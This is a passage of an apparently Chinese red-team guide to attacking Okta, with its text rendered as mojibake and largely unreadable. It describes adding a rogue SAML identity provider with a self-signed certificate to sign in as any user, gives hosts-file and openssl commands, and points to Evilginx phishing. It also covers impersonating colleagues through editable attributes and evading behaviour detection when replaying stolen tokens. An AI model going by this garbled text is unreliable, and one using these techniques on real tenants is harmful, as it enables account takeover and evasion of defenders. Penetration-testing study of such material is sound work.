ä¸ºäº†æµ‹è¯•è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦éƒ¨ç½²ä¸€ä¸ªè‡ªå®šä¹‰çš„èº«ä»½æä¾›å•†ã€‚ä¸€ä¸ªéå¸¸ç®€é™‹çš„æ”¯æŒæˆ‘ä»¬ä¸æ³•æ´»åŠ¨çš„ SAML IDP å¯ä»¥åœ¨[è¿™é‡Œ](https://github.com/xpn/OktaPostExToolkit)æ‰¾åˆ°ã€‚è¿™ä¸ªå·¥å…·èƒŒåçš„æ ¸å¿ƒæ€æƒ³æ˜¯å…è®¸æˆ‘ä»¬å‘å‡ºç­¾åçš„ SAML è®¤è¯å“åº”ï¼Œè¿™äº›å“åº”å¯¹åº”äºæˆ‘ä»¬å–œæ¬¢çš„ä»»ä½•ç”¨æˆ·ã€‚

è¿™ä¸ªæœåŠ¡å™¨å°†åœ¨ `/saml` ä¸Šç›‘å¬ä¼ å…¥çš„ HTTP è¯·æ±‚ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆéœ€è¦å°†ä¸€ä¸ª IDP éƒ¨ç½²åˆ° Oktaã€‚

é¦–å…ˆï¼Œæˆ‘ä»¬é€‰æ‹© SAML 2.0 IDPï¼š

<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

åœ¨é…ç½® IDP æ—¶ï¼Œæˆ‘ä»¬éœ€è¦æ³¨æ„ä¸€äº›è®¾ç½®ã€‚ç¬¬ä¸€ä¸ªæ˜¯ `Name`ï¼Œè¿™æ˜¯è¦æ˜¾ç¤ºç»™ Okta çš„å…¶ä»–ç®¡ç†å‘˜çš„å‹å¥½åç§°ã€‚

æ¥ä¸‹æ¥æ˜¯å‘è¡Œè€… URLï¼Œåº”è¯¥è®¾ç½®ä¸º URI æ ¼å¼çš„æ ‡è¯†ç¬¦çš„å€¼ã€‚è¿™å†æ¬¡å¯ä»¥æ˜¯ä»»ä½•ä¸œè¥¿ï¼Œä½†æˆ‘ä»¬å°†ä½¿ç”¨ `https://www.example.com/`ã€‚

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

æˆ‘ä»¬è¿˜éœ€è¦è®¾ç½® `IdP å•ç‚¹ç™»å½• URL` å­—æ®µï¼ŒæŒ‡å‘æˆ‘ä»¬çš„ SAML æœåŠ¡å™¨æ­£åœ¨è¿è¡Œçš„ä½ç½®ã€‚ç°åœ¨ï¼Œé…·çš„æ˜¯è¿™ä¸ª URL ä¸éœ€è¦æŒ‡å‘æˆ‘ä»¬çš„æœåŠ¡å™¨ã€‚æˆ‘è§‰å¾—å€¼å¾—æŒ‡å‡ºè¿™ä¸€ç‚¹ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œè¾“å…¥çš„ URL ä¸Šå˜å¾—ç›¸å½“æœ‰åˆ›æ„ï¼Œä½¿è“é˜Ÿçš„å·¥ä½œå˜å¾—æ›´éš¾ä¸€äº›ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬æ„¿æ„ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªå­—æ®µè®¾ç½®ä¸ºç±»ä¼¼ `https://idp.google.com/saml` çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬å”¯ä¸€éœ€è¦åšçš„å°±æ˜¯èƒ½å¤Ÿæ•è·ä¼ å…¥çš„ SAML è¯·æ±‚ã€‚è¿™é‡Œæœ‰ä¸ªé…·äº‹ï¼šSAML è¯·æ±‚æ˜¯å®¢æˆ·ç«¯è½¬å‘çš„ã€‚æˆ‘çš„æ„æ€æ˜¯ï¼ŒOkta å°†ç”Ÿæˆ SAML `AuthRequest` å¹¶è®©æˆ‘ä»¬çš„æµè§ˆå™¨é‡å®šå‘åˆ° `https://idp.google.com/` ä»¥åŠ SAML è¯·æ±‚ã€‚å½“ç„¶ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ç®€å•åœ°ä¿®æ”¹æœ¬åœ° hosts æ–‡ä»¶ï¼Œå°† `idp.google.com` æŒ‡å‘ `127.0.0.1`ï¼š
```bash
echo '127.0.0.1 idp.google.com' | sudo tee -a /etc/hosts
```
æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªæˆ‘ä»¬æ§åˆ¶çš„ç­¾åè¯ä¹¦ã€‚è¿™å¯ä»¥æ˜¯è‡ªç­¾åçš„ï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨OpenSSLç”Ÿæˆï¼š

{% code overflow="wrap" %}
```bash
openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes -keyout example.com.key -out example.com.crt
```
{% endcode %}

æ‚¨å¯ä»¥åœ¨æ­¤å‘æŒ¥åˆ›æ„ï¼Œå› ä¸ºå¯¹è¿™ä¸ªè¯ä¹¦çš„çœŸå®æ€§æ²¡æœ‰å…·ä½“è¦æ±‚ã€‚

å¯†é’¥ç”Ÿæˆåï¼Œæˆ‘ä»¬åªéœ€å°†è¯ä¹¦ä¸Šä¼ åˆ°Oktaå¹¶åˆ›å»ºæˆ‘ä»¬çš„IDPã€‚

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

æœ€åï¼Œæˆ‘ä»¬éœ€è¦ç¡®ä¿`Match Against`è®¾ç½®ä¸º`Okta Username or Email`ï¼Œå¹¶ä¸”`Account Link Policy`è®¾ç½®ä¸º`Automatic`ï¼Œä»¥å…è®¸æˆ‘ä»¬å¯¹ç°æœ‰çš„Oktaè´¦æˆ·è¿›è¡Œè®¤è¯ï¼š

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

ä¿å­˜æ‰€æœ‰è®¾ç½®åï¼Œæˆ‘ä»¬éœ€è¦ä¸‹è½½å…ƒæ•°æ®ï¼š

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

ç„¶åï¼Œä¸ºäº†å‘èµ·è®¤è¯è¯·æ±‚å¹¶å‘å‡º`AuthRequest`ï¼Œæˆ‘ä»¬å¯¼èˆªåˆ°`Assertion Consumer Service URL`ä¸­æ˜¾ç¤ºçš„URLï¼š

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

å¯¼èˆªåˆ°è¿™ä¸ªURLä¼šå¯¼è‡´é‡å®šå‘åˆ°æˆ‘ä»¬å†…éƒ¨çš„SAMLæœåŠ¡å™¨ï¼š

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

å¦‚æœæˆ‘ä»¬æä¾›ä¸€ä¸ªç”µå­é‚®ä»¶åœ°å€ï¼Œæˆ‘ä»¬ä¼šå‘ç°æˆ‘ä»¬å¯ä»¥ä½œä¸ºä»»ä½•Oktaç”¨æˆ·è¿›è¡Œè®¤è¯ï¼Œè€Œæ— éœ€çŸ¥é“ä»–ä»¬çš„å‡­æ®ã€‚

è®©æˆ‘ä»¬åœ¨[https://youtu.be/uw1hlKNDG2c](https://youtu.be/uw1hlKNDG2c)ä¸­çœ‹åˆ°è¿™ä¸ªæ“ä½œã€‚

### ä½¿ç”¨Evilgnixå¯¹Oktaé—¨æˆ·è¿›è¡Œç½‘ç»œé’“é±¼

åœ¨[**è¿™ç¯‡åšå®¢æ–‡ç« **](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)ä¸­è§£é‡Šäº†å¦‚ä½•å‡†å¤‡é’ˆå¯¹Oktaé—¨æˆ·çš„ç½‘ç»œé’“é±¼æ´»åŠ¨ã€‚

### åŒäº‹å†’å……æ”»å‡»

ç”¨æˆ·å¯ä»¥æ‹¥æœ‰å’Œä¿®æ”¹çš„**å±æ€§**ï¼ˆå¦‚ç”µå­é‚®ä»¶æˆ–åå­—ï¼‰å¯ä»¥åœ¨Oktaä¸­é…ç½®ã€‚å¦‚æœä¸€ä¸ª**åº”ç”¨ç¨‹åº**å°†ç”¨æˆ·å¯ä»¥**ä¿®æ”¹**çš„**å±æ€§**ä½œä¸ºID**ä¿¡ä»»**ï¼Œä»–å°†èƒ½å¤Ÿ**åœ¨è¯¥å¹³å°ä¸Šå†’å……å…¶ä»–ç”¨æˆ·**ã€‚

å› æ­¤ï¼Œå¦‚æœåº”ç”¨ç¨‹åºä¿¡ä»»å­—æ®µ**`userName`**ï¼Œä½ å¯èƒ½æ— æ³•æ›´æ”¹å®ƒï¼ˆå› ä¸ºä½ é€šå¸¸ä¸èƒ½æ›´æ”¹è¯¥å­—æ®µï¼‰ï¼Œä½†å¦‚æœå®ƒä¿¡ä»»ä¾‹å¦‚**`primaryEmail`**ï¼Œä½ å¯èƒ½èƒ½å¤Ÿ**å°†å…¶æ›´æ”¹ä¸ºåŒäº‹çš„ç”µå­é‚®ä»¶åœ°å€**å¹¶å†’å……ä»–ï¼ˆä½ éœ€è¦è®¿é—®è¯¥ç”µå­é‚®ä»¶å¹¶æ¥å—æ›´æ”¹ï¼‰ã€‚

è¯·æ³¨æ„ï¼Œè¿™ç§å†’å……å–å†³äºæ¯ä¸ªåº”ç”¨ç¨‹åºçš„é…ç½®æ–¹å¼ã€‚åªæœ‰ä¿¡ä»»ä½ ä¿®æ”¹çš„å­—æ®µå¹¶æ¥å—æ›´æ–°çš„åº”ç”¨ç¨‹åºæ‰ä¼šå—åˆ°å½±å“ã€‚\
å› æ­¤ï¼Œå¦‚æœåº”ç”¨ç¨‹åºå­˜åœ¨æ­¤å­—æ®µï¼Œåº”å¯ç”¨å®ƒï¼š

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

æˆ‘ä¹Ÿçœ‹åˆ°å…¶ä»–åº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ï¼Œä½†åœ¨Oktaè®¾ç½®ä¸­æ²¡æœ‰è¯¥å­—æ®µï¼ˆæœ€ç»ˆä¸åŒçš„åº”ç”¨ç¨‹åºé…ç½®ä¸åŒï¼‰ã€‚

æ‰¾å‡ºä½ æ˜¯å¦å¯ä»¥åœ¨æ¯ä¸ªåº”ç”¨ç¨‹åºä¸Šå†’å……ä»»ä½•äººçš„æœ€ä½³æ–¹æ³•æ˜¯å°è¯•å®ƒï¼

## è§„é¿è¡Œä¸ºæ£€æµ‹ç­–ç•¥ <a href="#9fde" id="9fde"></a>

é™¤éäº‹å…ˆæŠ«éœ²ï¼Œå¦åˆ™ä½ å¯èƒ½ä¸ä¼šçŸ¥é“æ˜¯å¦å®æ–½äº†è¡Œä¸ºæ£€æµ‹ç­–ç•¥ï¼Œç›´åˆ°ä½ é‡åˆ°å®ƒä»¬ã€‚ä¸€ç§**å¯èƒ½ç»•è¿‡Oktaè¡Œä¸º**æ£€æµ‹ç­–ç•¥çš„æ–¹æ³•æ˜¯ç®€å•åœ°**é¿å¼€ä¸»Oktaä»ªè¡¨æ¿**ï¼Œç›´æ¥é’ˆå¯¹Oktaåº”ç”¨ç¨‹åºï¼ˆè¿™å°†æ˜¯ä¸Šé¢æˆªå›¾ä¸­è¢«çº¢è‰²æ¡†é®ä½çš„åº”ç”¨ç¨‹åºï¼‰ã€‚å¦‚æœä½ æ‹¥æœ‰Oktaè®¿é—®ä»¤ç‰Œï¼Œè€Œä¸æ˜¯åœ¨ç›®æ ‡å…¬å¸çš„ä¸»Oktaç™»å½•é¡µé¢é‡æ”¾ä»¤ç‰Œï¼Œä½ åº”è¯¥åœ¨ç‰¹å®šåº”ç”¨ç¨‹åºçš„Okta URLå¤„é‡æ”¾ä»¤ç‰Œã€‚

å…¶ä»–å»ºè®®åŒ…æ‹¬ï¼š

* å°å¿ƒä»æµè¡Œçš„åŒ¿åä»£ç†å’ŒVPNæœåŠ¡é‡æ”¾æ•è·çš„è®¿é—®ä»¤ç‰Œã€‚
* é‡æ”¾è®¿é—®ä»¤ç‰Œæ—¶ï¼Œä½¿ç”¨å®¢æˆ·ç«¯ä½¿ç”¨çš„ç›¸åŒç”¨æˆ·ä»£ç†å­—ç¬¦ä¸²ã€‚
* å°å¿ƒä»åŒä¸€IPåœ°å€çš„ä¸åŒç”¨æˆ·é‚£é‡Œé‡æ”¾æ•è·çš„è®¿é—®ä»¤ç‰Œã€‚
* å°å¿ƒå¯¹Oktaä»ªè¡¨æ¿é‡æ”¾æ•è·çš„è®¿é—®ä»¤ç‰Œã€‚
* å¦‚æœä½ çŸ¥é“å—å®³è€…å°†ä½¿ç”¨çš„å…¬å¸IPåœ°å€ï¼Œè¯·è€ƒè™‘é˜»æ­¢é™¤è¯¥IPæˆ–IPèŒƒå›´ä¹‹å¤–çš„æ‰€æœ‰å…¶ä»–æµé‡ã€‚

## OktaåŠ å›º

Oktaæœ‰å¾ˆå¤šå¯èƒ½çš„é…ç½®ï¼Œåœ¨è¿™ä¸ªé¡µé¢ä½ ä¼šå‘ç°å¦‚ä½•å®¡æŸ¥å®ƒä»¬ï¼Œä½¿å®ƒä»¬å°½å¯èƒ½å®‰å…¨ï¼š

{% content-ref url="okta-hardening.md" %}
[okta-hardening.md](okta-hardening.md)
{% endcontent-ref %}

## å‚è€ƒèµ„æ–™

* [https://trustedsec.com/blog/okta-for-red-teamers](https://trustedsec.com/blog/okta-for-red-teamers)
* [https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>
